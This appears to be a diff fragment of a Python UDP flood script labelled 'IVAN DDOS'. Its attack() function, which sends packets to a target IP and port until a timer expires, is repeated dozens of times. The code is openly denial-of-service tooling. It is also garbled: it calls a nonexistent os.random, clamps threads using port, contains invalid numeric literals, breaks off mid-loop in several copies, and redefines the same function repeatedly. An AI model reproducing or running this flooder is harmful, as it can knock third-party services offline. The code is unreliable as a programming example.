+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
